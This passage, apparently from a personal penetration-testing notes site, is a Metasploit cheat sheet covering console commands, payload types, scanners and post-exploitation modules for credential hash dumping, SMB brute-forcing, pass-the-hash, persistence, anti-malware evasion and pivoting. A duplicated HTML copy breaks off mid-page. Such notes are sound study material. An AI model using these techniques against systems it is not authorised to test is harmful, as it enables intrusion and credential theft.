record-keeping)\nuse — select a Metasploit module/exploit\nvulns — display vulnerabilities discovered in known hosts in DB\nworkspace — use workspaces; keeps database results isolated per engagement\n\nNote that you can also call regular shell commands (ip, ls, etc.) from msfconsole. You can also background processes using Ctrl + Z (Metasploit will trap this, so you don’t have to worry about backgrounding the entire msfconsole).\nModules\nModule categories:\n\nAuxiliary (odds-n-ends)\nEncoders (re-encode exploits to thwart signature-based anti-malware solutions)\nEvasion (attempt to directly evade anti-malware solutions)\nExploits\nNOPS (no-op code that can be used to pad exploits to a needed size)\nPayloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)\nPost (additional post-exploitation tools)\n\nNote that Metasploit 6 apparently calls these “framework plugins” now.\n\nRemember: Open up the port Metasploit’s going to use in your firewall before running the exploit. Generally this is port 4444 by default (set with LPORT).\nAlso Remember: Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)\nAlso also Remember: Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you’re trying to exploit a service that’s not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine’s external address, as the exploit won’t be connecting back over the SSH tunnel (obviously)! Since LHOST is also used to determine where the exploit’s listener binds to, it’s sometimes necessary to set the optional ReverseListenerBindAddress in these cases (typically when you do this, LHOST will be some remote system you’re tunneled into, and ReverseListenerBindAddress will be 127.0.0.1).\n\nOptions\nThe common RHOSTS option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as file:/path/to/file.txt).\nMost modules support the ARCH, PAYLOAD, and SESSION options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are not shown when running show options.\nYou can reset individual parameters using unset, and reset the entire module using unset all.\nEquivalent module commands:\n\nset -g = setg\nunset -g = unsetg\nrun = exploit\n\nSome exploit modules have a check option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many don’t have a check at all. YMMV!\nPayloads\nPayloads can be divided into:\n\nSingles (self-contained; also indicated by the use of an _ separating “shell” from the rest of the payload name, as in shell_reverse_tcp)\nStagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)\nStages (payloads designed to be downloaded by a stager; also indicated by the use of a / separating “shell” from the rest of the payload name, as in shell/reverse_tcp)\n\nPayloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads).\n\n\n                  \n                  Important\n                  \n                \n\n\nMetasploit defaults to sending 32-bit payloads, but an increasing number of things won’t work on a 64-bit system from a 32-bit meterpreter shell. It’s probably best to explicitly set the payload option to use a 64-bit payload unless you know that you’ll be dealing with a 32-bit system.\n\n\n\nList all available payloads using msfvenom --list payloads or show payloads from within the Metasploit console.\nA specific payload can be set in the Metasploit console use the set PAYLOAD full/path/to/payload.\nIf you initially get a native shell, use the post/multi/manage/shell_to_meterpreter module to upgrade to Meterpeter.\n\n\n                  \n                  Note\n                  \n                \n\n\nshell_to_meterpreter creates a new connection on a new port, by default 4433.\n\n\n\nScanners\nUse search portscan to display built-in Metasploit port scanners. Note that msfconsole needs to be run as root for many scans to work — just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don’t work over a VPN… So maybe best to stick with Nmap.\nTargeted scanners can be more useful, however:\n\nThe auxiliary/scanner/discovery/udp_sweep module will probe for common UDP services.\nThe auxiliary/scanner/http/http_version module will give you HTTP server version information.\nThe auxiliary/scanner/smb/smb_login module will allow you to conduct brute-force and password spraying attacks against Samba logins.\n\nMetasploit has a variety of Samba/CIFS scanners too (use search scanner/smb to list them), as well as modules for basic enumeration such as smtp_version/smtp_enum (for SMTP) and mysql_sql (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).\nExploits\n\nexploit/multi/handler — Catch a shell produced using msfvenom. Note that you’ll need to use set payload to tell Metasploit what it’s catching — for example, windows/meterpreter/reverse_tcp (or windows/x64/meterpreter/reverse_tcp). Both regular reverse shells and meterpreter sessions can be caught this way.\nexploit/windows/smb/psexec — Call PsExec over SMB (instantiates meterpreter by default). Only works if SMBUser has admin privileges on the target!\n\nNote that any Windows exploit that requires a password will also accept an NTLM hash (the LMHash part can be replaced by an appropriately-sized string of 0 characters if not available).\nmeterpreter\nPotentially useful Metsploit modules to run from/besides meterpreter:\n\npost/windows/gather/checkvm — try to determine if we’re in a VM\npost/multi/recon/local_exploit_suggester — find possible privilege escalation exploits (can be slow/unreliably on 64-bit architectures)\npost/windows/gather/enum_shares — enumerate shares\nauxiliary/scanner/smb/smb_enumusers_domain — enumerate SMB domain users (requires existing admin credentials)\npost/windows/gather/hashdump — same as the hashdump command, but pushes the hashes into the Metasploit DB\npost/windows/gather/smart_hashdump GETSYSTEM=FALSE — same as the hashdump command, but pushes the hashes into the Metasploit DB and ignores system accounts\nauxiliary/analyze/crack_windows — sic John the Ripper or Hashcat on NTLM hashes stored in the Metasploit DB\npost/windows/manage/enable_rdp — enable RDP access (requires admin privileges)\npost/multi/manage/autoroute — manipulate target routing for pivoting\nauxiliary/server/socks_proxy — start a SOCKS proxy\nexploit/windows/local/persistence — sets up a persistent connection (you probably want to set STARTUP SYSTEM)… without a password!\n\n\n\n                  \n                  Tip\n                  \n                \n\n\nIt is generally more useful to background meterpreter and then run these commands through the Metasploit console, as within meterpreter they need to have all options specified on the “run” command line (in the console you can access help, actually see what the options are, etc.).\n\n\n\nThere seem to be a lot of options for the post/multi/manage/autoroute and auxiliary/server/socks_proxy modules, but I don’t see a way to access them from meterpreter (it looks like to get help you need to background meterpreter and use the console).\nThe advantage of setting up a SOCKS proxy on the target is that you can then use proxychains to route through the target; this can allow you to pivot more deeply into the network that you’re attacking. (You probably want to create a custom proxychains.conf file to do this. Fortunately, /etc/proxychains.conf is well documented.)\nCIFS\nMetasploit can also enumerate CIFS users using the auxiliary/smb/smb_lookupsid module.\nLike Nmap, I’ve found this to be a bit unreliable on UNIX-like systems.\nMS SQL\nTransclude of Metasploit-MS-SQL-modules","richContent":"&lt;p&gt;Basic Metasploit flow:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;use $MODULE_NAME&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;set $OPTIONS&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;run&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;You can use msfconsole as a shell, but there’s no redirect functionality.&lt;/p&gt;\n&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#commands&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;back&lt;/code&gt; — exit the current module&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;db_nmap $FLAGS $IP&lt;/code&gt; — run &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; and dump the results into the Metasploit DB; all &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; &lt;code&gt;$FLAGS&lt;/code&gt; are supported and Metasploit will elevate privileges if necessary&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;help&lt;/code&gt; — get Metasploit help&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;history&lt;/code&gt; — display command history&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;hosts&lt;/code&gt; — display known hosts in DB&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;hosts -d&lt;/code&gt; — delete saved hosts from DB&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;info&lt;/code&gt; — show module information (including exploit target options)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;jobs&lt;/code&gt; — check the status of background jobs&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;options&lt;/code&gt; (&lt;code&gt;advanced&lt;/code&gt;) — show module/exploit options (or “advanced” options)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;run&lt;/code&gt;/&lt;code&gt;exploit&lt;/code&gt; — run the selected exploit&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;run -j&lt;/code&gt; — run the selected exploit as a background job&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;search&lt;/code&gt; — search modules; query to a particular type of module using the &lt;code&gt;type:&lt;/code&gt; parameter (e.g., &lt;code&gt;search type:exploit wordpress&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;services&lt;/code&gt; — display services discovered in known hosts in DB&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;sessions&lt;/code&gt; — list open &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; sessions on a box&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;sessions -i $SESSION_NUMER&lt;/code&gt; — connect to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; session &lt;code&gt;$SESSION_NUMBER&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;show auxiliary&lt;/code&gt; — show auxiliary modules, filtered by relevancy if called from within a module&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;show exploits&lt;/code&gt; — show exploit modules&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;show options&lt;/code&gt; — show module options&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;show payloads&lt;/code&gt; — show payload modules, filtered by relevancy if called from within a module&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;spool&lt;/code&gt; — save all console output to a log file (useful for record-keeping)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;use&lt;/code&gt; — select a Metasploit module/exploit&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;vulns&lt;/code&gt; — display vulnerabilities discovered in known hosts in DB&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;workspace&lt;/code&gt; — use workspaces; keeps database results isolated per engagement&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that you can also call regular shell commands (ip, ls, etc.) from msfconsole. You can also background processes using &lt;code&gt;Ctrl + Z&lt;/code&gt; (Metasploit will trap this, so you don’t have to worry about backgrounding the entire msfconsole).&lt;/p&gt;\n&lt;h2 id=&quot;modules&quot;&gt;Modules&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#modules&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Module categories:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Auxiliary (odds-n-ends)&lt;/li&gt;\n&lt;li&gt;Encoders (re-encode exploits to thwart signature-based anti-malware solutions)&lt;/li&gt;\n&lt;li&gt;Evasion (attempt to directly evade anti-malware solutions)&lt;/li&gt;\n&lt;li&gt;Exploits&lt;/li&gt;\n&lt;li&gt;NOPS (no-op code that can be used to pad exploits to a needed size)&lt;/li&gt;\n&lt;li&gt;Payloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)&lt;/li&gt;\n&lt;li&gt;Post (additional post-exploitation tools)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that Metasploit 6 apparently calls these “framework plugins” now.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;strong&gt;Remember:&lt;/strong&gt; Open up the port Metasploit’s going to use in your firewall &lt;em&gt;before&lt;/em&gt; running the exploit. Generally this is port 4444 by default (set with LPORT).&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Also Remember:&lt;/strong&gt; Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;Also &lt;em&gt;also&lt;/em&gt; Remember:&lt;/strong&gt; Sometimes you might find yourself in the position of trying to exploit a service over an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; tunnel (for example, if you’re trying to exploit a service that’s not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine’s external address, as the exploit won’t be connecting back over the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; tunnel (obviously)! Since LHOST is also used to determine where the exploit’s listener binds to, it’s sometimes necessary to set the optional ReverseListenerBindAddress in these cases (typically when you do this, LHOST will be some remote system you’re tunneled into, and ReverseListenerBindAddress will be 127.0.0.1).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;options&quot;&gt;Options&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#options&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The common RHOSTS option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as &lt;code&gt;file:/path/to/file.txt&lt;/code&gt;).&lt;/p&gt;\n&lt;p&gt;Most modules support the ARCH, PAYLOAD, and SESSION options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are &lt;em&gt;not&lt;/em&gt; shown when running &lt;code&gt;show options&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;You can reset individual parameters using &lt;code&gt;unset&lt;/code&gt;, and reset the entire module using &lt;code&gt;unset all&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Equivalent module commands:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;set -g&lt;/code&gt; = &lt;code&gt;setg&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;unset -g&lt;/code&gt; = &lt;code&gt;unsetg&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;run&lt;/code&gt; = &lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Some exploit modules have a &lt;code&gt;check&lt;/code&gt; option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many &lt;em&gt;don’t&lt;/em&gt; have a check at all. YMMV!&lt;/p&gt;\n&lt;h2 id=&quot;payloads&quot;&gt;Payloads&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#payloads&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Payloads can be divided into:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Singles (self-contained; also indicated by the use of an &lt;code&gt;_&lt;/code&gt; separating “shell” from the rest of the payload name, as in &lt;code&gt;shell_reverse_tcp&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;Stagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)&lt;/li&gt;\n&lt;li&gt;Stages (payloads designed to be downloaded by a stager; also indicated by the use of a &lt;code&gt;/&lt;/code&gt; separating “shell” from the rest of the payload name, as in &lt;code&gt;shell/reverse_tcp&lt;/code&gt;)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads).&lt;/p&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Metasploit defaults to sending 32-bit payloads, but an increasing number of things won’t work on a 64-bit system from a 32-bit &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell. It’s probably best to explicitly set the &lt;code&gt;payload&lt;/code&gt; option to use a 64-bit payload unless you &lt;em&gt;know&lt;/em&gt; that you’ll be dealing with a 32-bit system.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;List all available payloads using &lt;code&gt;msfvenom --list payloads&lt;/code&gt; or &lt;code&gt;show payloads&lt;/code&gt; from within the Metasploit console.&lt;/p&gt;\n&lt;p&gt;A specific payload can be set in the Metasploit console use the &lt;code&gt;set PAYLOAD full/path/to/payload&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;If you initially get a native shell, use the &lt;code&gt;post/multi/manage/shell_to_meterpreter&lt;/code&gt; module to upgrade to Meterpeter.&lt;/p&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;code&gt;shell_to_meterpreter&lt;/code&gt; creates a new connection on a new port, by default 4433.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h3 id=&quot;scanners&quot;&gt;Scanners&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#scanners&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Use &lt;code&gt;search portscan&lt;/code&gt; to display built-in Metasploit port scanners. Note that msfconsole needs to be run as root for many scans to work — just like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;. That said, in my experience the fancier &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; scans (for example, SYN) don’t work over a VPN… So maybe best to stick with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;Targeted scanners can be more useful, however:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;The &lt;code&gt;auxiliary/scanner/discovery/udp_sweep&lt;/code&gt; module will probe for common &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; services.&lt;/li&gt;\n&lt;li&gt;The &lt;code&gt;auxiliary/scanner/http/http_version&lt;/code&gt; module will give you &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; server version information.&lt;/li&gt;\n&lt;li&gt;The &lt;code&gt;auxiliary/scanner/smb/smb_login&lt;/code&gt; module will allow you to conduct brute-force and password spraying attacks against Samba logins.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Metasploit has a variety of Samba/CIFS scanners too (use &lt;code&gt;search scanner/smb&lt;/code&gt; to list them), as well as modules for basic enumeration such as &lt;code&gt;smtp_version&lt;/code&gt;/&lt;code&gt;smtp_enum&lt;/code&gt; (for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SMTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SMTP&quot;&gt;SMTP&lt;/a&gt;) and &lt;code&gt;mysql_sql&lt;/code&gt; (for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt;, though this seems to just be a thin wrapper around the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt; command line client).&lt;/p&gt;\n&lt;h3 id=&quot;exploits&quot;&gt;Exploits&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#exploits&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;exploit/multi/handler&lt;/code&gt; — Catch a shell produced using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfvenom&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfvenom&quot;&gt;msfvenom&lt;/a&gt;. Note that you’ll need to use &lt;code&gt;set payload&lt;/code&gt; to tell Metasploit &lt;em&gt;what&lt;/em&gt; it’s catching — for example, &lt;code&gt;windows/meterpreter/reverse_tcp&lt;/code&gt; (or &lt;code&gt;windows/x64/meterpreter/reverse_tcp&lt;/code&gt;). Both regular reverse shells and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; sessions can be caught this way.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;exploit/windows/smb/psexec&lt;/code&gt; — Call PsExec over SMB (instantiates &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; by default). &lt;em&gt;Only works if &lt;code&gt;SMBUser&lt;/code&gt; has admin privileges on the target!&lt;/em&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that any Windows exploit that requires a password will also accept an NTLM hash (the LMHash part can be replaced by an appropriately-sized string of 0 characters if not available).&lt;/p&gt;\n&lt;h3 id=&quot;meterpreter&quot;&gt;meterpreter&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#meterpreter&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Potentially useful Metsploit modules to &lt;code&gt;run&lt;/code&gt; from/besides &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt;:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;post/windows/gather/checkvm&lt;/code&gt; — try to determine if we’re in a VM&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;post/multi/recon/local_exploit_suggester&lt;/code&gt; — find possible privilege escalation exploits (can be slow/unreliably on 64-bit architectures)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;post/windows/gather/enum_shares&lt;/code&gt; — enumerate shares&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;auxiliary/scanner/smb/smb_enumusers_domain&lt;/code&gt; — enumerate SMB domain users (requires existing admin credentials)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;post/windows/gather/hashdump&lt;/code&gt; — same as the &lt;a href=&quot;https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;hashdump command&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, but pushes the hashes into the Metasploit DB&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;post/windows/gather/smart_hashdump GETSYSTEM=FALSE&lt;/code&gt; — same as the hashdump command, but pushes the hashes into the Metasploit DB and ignores system accounts&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;auxiliary/analyze/crack_windows&lt;/code&gt; — sic &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/John-the-Ripper&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/John-the-Ripper&quot;&gt;John the Ripper&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; on &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; 